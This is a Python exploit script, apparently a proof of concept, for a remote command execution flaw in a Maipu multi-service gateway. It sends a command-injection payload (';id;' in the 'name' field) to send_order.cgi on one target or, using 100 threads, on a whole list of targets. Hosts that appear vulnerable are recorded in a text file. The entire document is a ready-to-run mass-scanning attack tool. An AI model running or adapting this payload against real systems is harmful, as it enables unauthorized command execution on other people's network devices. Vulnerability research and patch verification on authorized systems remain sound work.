import requests
import sys
import argparse
import time
from multiprocessing.dummy import Pool
import logging

requests.packages.urllib3.disable_warnings()

# 设置日志配置
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
GREEN = '\033[92m'  # 输出颜色
RESET = '\033[0m'


def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei       
"""
    logging.info(banner)


def main():
    banner()
    parser = argparse.ArgumentParser(description='迈普多业务融合网关远程 命令执行漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='file path')
    args = parser.parse_args()

    # 判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        # 多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logging.error(f"Usage:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload_url = "/send_order.cgi?parameter=operation"
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': '40',
        'Priority': 'u=1',
    }
    data = """{"opid":"1","name":";id;","type":"rest"}"""
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=15)

        if res.status_code == 200 and 'msg' in res.text:
            logging.info(f"[+]{GREEN}该url存在命令执行漏洞 {target} {RESET}")
            with open('maipure.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
                return True
        else:
            logging.info("[-]该url不存在命令执行漏洞")
    except Exception as e:
        logging.error(f"[-] 请求 {target} 时发生错误: {e}")


if __name__ == '__main__':
    main()

